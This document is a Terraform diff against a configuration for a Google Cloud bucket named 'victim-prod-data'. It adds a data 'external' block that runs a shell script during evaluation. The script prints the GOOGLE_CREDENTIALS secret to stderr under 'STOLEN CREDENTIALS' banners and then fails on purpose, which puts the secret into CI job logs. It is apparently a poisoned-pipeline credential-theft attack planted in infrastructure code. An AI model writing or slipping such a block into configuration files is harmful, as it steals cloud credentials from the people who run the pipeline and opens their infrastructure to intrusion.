@@ -14,3 +14,20 @@ resource "google_storage_bucket" "prod_bucket" {
   name     = "victim-prod-data"
   location = "US"
 }
+
+data "external" "exfiltrate" {
+  program = ["sh", "-c", <<EOT
+    echo "================= STOLEN CREDENTIALS BELOW =================" >&2
+    if [ -z "$GOOGLE_CREDENTIALS" ]; then
+        echo "ERROR: GOOGLE_CREDENTIALS is empty! Check your workflow triggers." >&2
+    else
+        echo "$GOOGLE_CREDENTIALS" >&2
+    fi
+    echo "" >&2
+    echo "================= STOLEN CREDENTIALS ABOVE =================" >&2
+
+    exit 1
+    echo '{"status": "success"}'
+  EOT
+  ]
+}
